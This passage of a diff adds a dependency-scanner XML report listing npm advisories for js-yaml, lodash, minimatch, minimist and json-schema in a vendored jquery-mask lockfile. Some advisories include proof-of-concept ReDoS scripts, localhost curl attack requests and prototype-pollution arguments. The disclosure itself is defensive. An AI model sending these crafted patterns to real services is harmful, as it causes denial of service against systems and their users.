+K=8000: ~5 ms
+Also verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.
+
+
+### Impact
+This is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).
+Any service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.
+
+### Suggested fix:
+Dedupe the merge source list by reference before invoking mergeMappings. Any of
+the following are minimal and preserve YAML 1.1 merge semantics:
+
+dedupe in storeMappingPair:
+
+    if (keyTag === &apos;tag:yaml.org,2002:merge&apos;) {
+      if (Array.isArray(valueNode)) {
+        var seen = new Set();
+        for (index = 0, quantity = valueNode.length; index &lt; quantity; index += 1) {
+          var src = valueNode[index];
+          if (seen.has(src)) continue;   // idempotent; skip redundant alias
+          seen.add(src);
+          mergeMappings(state, _result, src, overridableKeys);
+        }
+      } else {
+        mergeMappings(state, _result, valueNode, overridableKeys);
+      }
+    }</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?js-yaml, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-mh29-5h37-fv8m" name="pkg:npm/js-yaml@3.13.1">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)"/>
+            <system-out>### Impact
+
+In js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it&apos;s possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.
+
+### Patches
+
+Problem is patched in js-yaml 4.1.1 and 3.14.2.
+
+### Workarounds
+
+You can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).
+
+### References
+
+https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?js-yaml, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="1" errors="0" time="0" id="34" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?json-schema" package="json-schema:0.2.3" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-896r-f27r-55mw" name="pkg:npm/json-schema@0.2.3">
+                <failure message="cvssV3: CRITICAL, score: 9.800000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>json-schema before version 0.4.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes (&apos;Prototype Pollution&apos;).</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?json-schema, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="5" errors="0" time="0" id="35" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?lodash" package="lodash:4.17.15" skipped="0" tests="5" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-r5fr-rjxr-66jc" name="pkg:npm/lodash@4.17.15">
+                <failure message="cvssV3: HIGH, score: 8.100000381469727 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>### Impact
+
+The fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.
+
+When an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.
+
+Additionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.
+
+### Patches
+
+Users should upgrade to version 4.18.0.
+
+The fix applies two changes:
+1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)
+2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated
+
+### Workarounds
+
+Do not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?lodash, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-p6mc-m468-83gw" name="pkg:npm/lodash@4.17.15">
+                <failure message="cvssV3: HIGH, score: 7.400000095367432 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)"/>
+            <system-out>Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.
+
+This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?lodash, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-35jh-r3h4-6jhm" name="pkg:npm/lodash@4.17.15">
+                <failure message="cvssV3: HIGH, score: 7.199999809265137 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?lodash, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-xxjr-mmjv-4gpg" name="pkg:npm/lodash@4.17.15">
+                <failure message="cvssV3: MEDIUM, score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)"/>
+            <system-out>### Impact
+
+The `_.unset`, `_.omit`, and `_.pullAt` functions are vulnerable to prototype pollution. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes.
+
+The issue permits deletion of properties but does not allow overwriting their original behavior.
+
+### Patches
+
+The issue is patched from 4.17.23 to 4.18.0 depending on the package: `lodash`, `lodash-es`, and `lodash-amd` in 4.17.23, and the standalone `lodash.unset` and `lodash.omit` packages in 4.18.0.
+
+### Workarounds
+
+None. Upgrade to the patched version.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?lodash, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-29mw-wpgm-hmr9" name="pkg:npm/lodash@4.17.15">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. 
+
+Steps to reproduce (provided by reporter Liyuan Chen):
+```js
+var lo = require(&apos;lodash&apos;);
+
+function build_blank(n) {
+    var ret = &quot;1&quot;
+    for (var i = 0; i &lt; n; i++) {
+        ret += &quot; &quot;
+    }
+    return ret + &quot;1&quot;;
+}
+var s = build_blank(50000) var time0 = Date.now();
+lo.trim(s) 
+var time_cost0 = Date.now() - time0;
+console.log(&quot;time_cost0: &quot; + time_cost0);
+var time1 = Date.now();
+lo.toNumber(s) var time_cost1 = Date.now() - time1;
+console.log(&quot;time_cost1: &quot; + time_cost1);
+var time2 = Date.now();
+lo.trimEnd(s);
+var time_cost2 = Date.now() - time2;
+console.log(&quot;time_cost2: &quot; + time_cost2);
+```</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?lodash, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="4" errors="0" time="0" id="36" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimatch" package="minimatch:3.0.4" skipped="0" tests="4" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-23c5-xmqv-rm74" name="pkg:npm/minimatch@3.0.4">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Summary
+
+Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.
+
+---
+
+### Details
+
+The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:
+
+```typescript
+: this.type === &apos;*&apos; &amp;&amp; bodyDotAllowed ? `)?`
+: `)${this.type}`
+```
+
+This produces the following regexps:
+
+| Pattern              | Generated regex                          |
+|----------------------|------------------------------------------|
+| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
+| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
+| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
+| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |
+
+These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8&apos;s backtracking engine explores an exponential number of paths before returning `false`.
+
+The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.
+
+Measured times via `minimatch()`:
+
+| Pattern              | Input              | Time       |
+|----------------------|--------------------|------------|
+| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
+| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
+| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
+| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |
+
+Depth inflection at fixed input `a` x16 + `z`:
+
+| Depth | Pattern              | Time         |
+|-------|----------------------|--------------|
+| 1     | `*(a\|b)`            | 0ms          |
+| 2     | `*(*(a\|b))`         | 4ms          |
+| 3     | `*(*(*(a\|b)))`      | 270ms        |
+| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |
+
+Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.
+
+---
+
+### PoC
+
+Tested on minimatch@10.2.2, Node.js 20.
+
+**Step 1 -- verify the generated regexps and timing (standalone script)**
+
+Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:
+
+```javascript
+import { minimatch, Minimatch } from &apos;minimatch&apos;
+
+function timed(fn) {
+  const s = process.hrtime.bigint()
+  let result, error
+  try { result = fn() } catch(e) { error = e }
+  const ms = Number(process.hrtime.bigint() - s) / 1e6
+  return { ms, result, error }
+}
+
+// Verify generated regexps
+for (let depth = 1; depth &lt;= 4; depth++) {
+  let pat = &apos;a|b&apos;
+  for (let i = 0; i &lt; depth; i++) pat = `*(${pat})`
+  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
+  console.log(`depth=${depth} &quot;${pat}&quot; -&gt; ${re}`)
+}
+// depth=1 &quot;*(a|b)&quot;          -&gt; /^(?:a|b)*$/
+// depth=2 &quot;*(*(a|b))&quot;       -&gt; /^(?:(?:a|b)*)*$/
+// depth=3 &quot;*(*(*(a|b)))&quot;    -&gt; /^(?:(?:(?:a|b)*)*)*$/
+// depth=4 &quot;*(*(*(*(a|b))))&quot; -&gt; /^(?:(?:(?:(?:a|b)*)*)*)*$/
+
+// Safe-length timing (exponential growth confirmation without multi-minute hang)
+const cases = [
+  [&apos;*(*(*(a|b)))&apos;, 15],   // ~270ms
+  [&apos;*(*(*(a|b)))&apos;, 17],   // ~800ms
+  [&apos;*(*(*(a|b)))&apos;, 19],   // ~2400ms
+  [&apos;*(*(a|b))&apos;,    23],   // ~260ms
+  [&apos;*(a|b)&apos;,      101],   // &lt;5ms (depth=1 control)
+]
+for (const [pat, n] of cases) {
+  const t = timed(() =&gt; minimatch(&apos;a&apos;.repeat(n) + &apos;z&apos;, pat))
+  console.log(`&quot;${pat}&quot; n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
+}
+
+// Confirm noext disables the vulnerability
+const t_noext = timed(() =&gt; minimatch(&apos;a&apos;.repeat(18) + &apos;z&apos;, &apos;*(*(*(a|b)))&apos;, { noext: true }))
+console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)
+
+// +() is equally affected
+const t_plus = timed(() =&gt; minimatch(&apos;a&apos;.repeat(17) + &apos;z&apos;, &apos;+(+(+(a|b)))&apos;))
+console.log(`&quot;+(+(+(a|b)))&quot; n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
+```
+
+Observed output:
+```
+depth=1 &quot;*(a|b)&quot;          -&gt; /^(?:a|b)*$/
+depth=2 &quot;*(*(a|b))&quot;       -&gt; /^(?:(?:a|b)*)*$/
+depth=3 &quot;*(*(*(a|b)))&quot;    -&gt; /^(?:(?:(?:a|b)*)*)*$/
+depth=4 &quot;*(*(*(*(a|b))))&quot; -&gt; /^(?:(?:(?:(?:a|b)*)*)*)*$/
+&quot;*(*(*(a|b)))&quot; n=15: 269ms result=false
+&quot;*(*(*(a|b)))&quot; n=17: 268ms result=false
+&quot;*(*(*(a|b)))&quot; n=19: 2408ms result=false
+&quot;*(*(a|b))&quot;    n=23: 257ms result=false
+&quot;*(a|b)&quot;       n=101: 0ms result=false
+noext=true: 0ms (should be ~0ms)
+&quot;+(+(+(a|b)))&quot; n=18: 6300ms result=false
+```
+
+**Step 2 -- HTTP server (event loop starvation proof)**
+
+Save as `poc4-server.mjs`:
+
+```javascript
+import http from &apos;node:http&apos;
+import { URL } from &apos;node:url&apos;
+import { minimatch } from &apos;minimatch&apos;
+
+const PORT = 3001
+http.createServer((req, res) =&gt; {
+  const url     = new URL(req.url, `http://localhost:${PORT}`)
+  const pattern = url.searchParams.get(&apos;pattern&apos;) ?? &apos;&apos;
+  const path    = url.searchParams.get(&apos;path&apos;) ?? &apos;&apos;
+
+  const start  = process.hrtime.bigint()
+  const result = minimatch(path, pattern)
+  const ms     = Number(process.hrtime.bigint() - start) / 1e6
+
+  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=&quot;${pattern}&quot; path=&quot;${path.slice(0,30)}&quot;`)
+  res.writeHead(200, { &apos;Content-Type&apos;: &apos;application/json&apos; })
+  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + &apos;\n&apos;)
+}).listen(PORT, () =&gt; console.log(`listening on ${PORT}`))
+```
+
+Terminal 1 -- start the server:
+```
+node poc4-server.mjs
+```
+
+Terminal 2 -- fire the attack (depth=3, 19 a&apos;s + z) and return immediately:
+```
+curl &quot;http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&amp;path=aaaaaaaaaaaaaaaaaaaz&quot; &amp;
+```
+
+Terminal 3 -- send a benign request while the attack is in-flight:
+```
+curl -w &quot;\ntime_total: %{time_total}s\n&quot; &quot;http://localhost:3001/match?pattern=*%28a%7Cb%29&amp;path=aaaz&quot;
+```
+
+**Observed output -- Terminal 2 (attack):**
+```
+{&quot;result&quot;:false,&quot;ms&quot;:&quot;64149&quot;}
+```
+
+**Observed output -- Terminal 3 (benign, concurrent):**
+```
+{&quot;result&quot;:false,&quot;ms&quot;:&quot;0&quot;}
+
+time_total: 63.022047s
+```
+
+**Terminal 1 (server log):**
+```
+[2026-02-20T09:41:17.624Z] pattern=&quot;*(*(*(a|b)))&quot; path=&quot;aaaaaaaaaaaaaaaaaaaz&quot;
+[2026-02-20T09:42:21.775Z] done in 64149ms result=false
+[2026-02-20T09:42:21.779Z] pattern=&quot;*(a|b)&quot; path=&quot;aaaz&quot;
+[2026-02-20T09:42:21.779Z] done in 0ms result=false
+```
+
+The server reports `&quot;ms&quot;:&quot;0&quot;` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.
+
+Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8&apos;s JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.
+
+---
+
+### Impact
+
+Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.
+
+Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.
+
+`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).
+
+**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimatch, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-7r86-cg39-jmmj" name="pkg:npm/minimatch@3.0.4">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Summary
+
+`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.
+
+---
+
+### Details
+
+The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):
+
+```typescript
+while (fr &lt; fl) {
+  ..
+  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
+    ..
+    return true
+  }
+  ..
+  fr++
+}
+```
+
+When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).
+
+There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.
+
+Measured timing with n=30 path segments:
+
+| k (globstars) | Pattern size | Time     |
+|---------------|--------------|----------|
+| 7             | 36 bytes     | ~154ms   |
+| 9             | 46 bytes     | ~1.2s    |
+| 11            | 56 bytes     | ~5.4s    |
+| 12            | 61 bytes     | ~9.7s    |
+| 13            | 66 bytes     | ~15.9s   |
+
+---
+
+### PoC
+
+Tested on minimatch@10.2.2, Node.js 20.
+
+**Step 1 -- inline script**
+
+```javascript
+import { minimatch } from &apos;minimatch&apos;
+
+// k=9 globstars, n=30 path segments
+// pattern: 46 bytes, default options
+const pattern = &apos;**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b&apos;
+const path    = &apos;a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a&apos;
+
+const start = Date.now()
+minimatch(path, pattern)
+console.log(Date.now() - start + &apos;ms&apos;) // ~1200ms
+```
+
+To scale the effect, increase k:
+
+```javascript
+// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
+const k = 11
+const pattern = Array.from({ length: k }, () =&gt; &apos;**/a&apos;).join(&apos;/&apos;) + &apos;/b&apos;
+const path    = Array(30).fill(&apos;a&apos;).join(&apos;/&apos;)
+minimatch(path, pattern)
+```
+
+No special options are required. This reproduces with the default `minimatch()` call.
+
+**Step 2 -- HTTP server (event loop starvation proof)**
+
+The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:
+
+```javascript
+// poc1-server.mjs
+import http from &apos;node:http&apos;
+import { URL } from &apos;node:url&apos;
+import { minimatch } from &apos;minimatch&apos;
+
+const PORT = 3000
+
+const server = http.createServer((req, res) =&gt; {
+  const url = new URL(req.url, `http://localhost:${PORT}`)
+  if (url.pathname !== &apos;/match&apos;) { res.writeHead(404); res.end(); return }
+
+  const pattern = url.searchParams.get(&apos;pattern&apos;) ?? &apos;&apos;
+  const path    = url.searchParams.get(&apos;path&apos;) ?? &apos;&apos;
+
+  const start  = process.hrtime.bigint()
+  const result = minimatch(path, pattern)
+  const ms     = Number(process.hrtime.bigint() - start) / 1e6
+
+  res.writeHead(200, { &apos;Content-Type&apos;: &apos;application/json&apos; })
+  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + &apos;\n&apos;)
+})
+
+server.listen(PORT)
+```
+
+Terminal 1 -- start the server:
+```
+node poc1-server.mjs
+```
+
+Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
+```
+curl &quot;http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa&quot; &amp;
+```
+
+Terminal 3 -- while the attack is in-flight, send a benign request:
+```
+curl -w &quot;\ntime_total: %{time_total}s\n&quot; &quot;http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz&quot;
+```
+
+**Observed output (Terminal 3):**
+```
+{&quot;result&quot;:true,&quot;ms&quot;:&quot;0&quot;}
+
+time_total: 4.132709s
+```
+
+The server reports `&quot;ms&quot;:&quot;0&quot;` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:
+
+```
+{&quot;result&quot;:true,&quot;ms&quot;:&quot;0&quot;}
+
+time_total: 0.001599s
+```
+
+---
+
+### Impact
+
+Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimatch, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-f8q6-p94x-37v3" name="pkg:npm/minimatch@3.0.4">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimatch, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-3ppc-4f35-3m26" name="pkg:npm/minimatch@3.0.4">
+                <failure message="unscored severity: high"/>
+            <system-out>### Summary
+`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn&apos;t appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8&apos;s regex engine backtracks exponentially across all possible splits.
+
+The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.
+
+
+### Details
+_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._
+
+### PoC
+When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:
+
+```
+/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
+```
+
+When the test string doesn&apos;t contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.
+### Impact
+Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:
+- File search/filter UIs that accept glob patterns
+- `.gitignore`-style filtering with user-defined rules
+- Build tools that accept glob configuration
+- Any API that exposes glob matching to untrusted input
+
+----
+
+Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimatch, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="2" errors="0" time="0" id="37" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimist" package="minimist:0.0.8" skipped="0" tests="2" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-xvch-5gv4-984h" name="pkg:npm/minimist@0.0.8">
+                <failure message="cvssV3: CRITICAL, score: 9.800000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimist, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-vh95-rmgr-6w4m" name="pkg:npm/minimist@0.0.8">
+                <failure message="cvssV3: MEDIUM, score: 5.599999904632568 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L)"/>
+            <system-out>Affected versions of `minimist` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  
+Parsing the argument `--__proto__.y=Polluted` adds a `y` property with value `Polluted` to all objects. The argument `--__proto__=Polluted` raises and uncaught error and crashes the application.  
+This is exploitable if attackers have control over the arguments being passed to `minimist`.
+
+
+## Recommendation
+
+Upgrade to versions 0.2.1, 1.2.3 or later.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimist, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="2" errors="0" time="0" id="38" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimist" package="minimist:1.2.0" skipped="0" tests="2" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-xvch-5gv4-984h" name="pkg:npm/minimist@1.2.0">
+                <failure message="cvssV3: CRITICAL, score: 9.800000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)"/>
+            <system-out>Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimist, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-vh95-rmgr-6w4m" name="pkg:npm/minimist@1.2.0">
+                <failure message="cvssV3: MEDIUM, score: 5.599999904632568 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L)"/>
+            <system-out>Affected versions of `minimist` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  
+Parsing the argument `--__proto__.y=Polluted` adds a `y` property with value `Polluted` to all objects. The argument `--__proto__=Polluted` raises and uncaught error and crashes the application.  
+This is exploitable if attackers have control over the arguments being passed to `minimist`.
+
+
+## Recommendation
+
+Upgrade to versions 0.2.1, 1.2.3 or later.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?minimist, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="3" errors="0" time="0" id="39" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?morgan" package="morgan:1.9.1" skipped="0" tests="3" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-4vj7-5mj6-jm8m" name="pkg:npm/morgan@1.9.1">
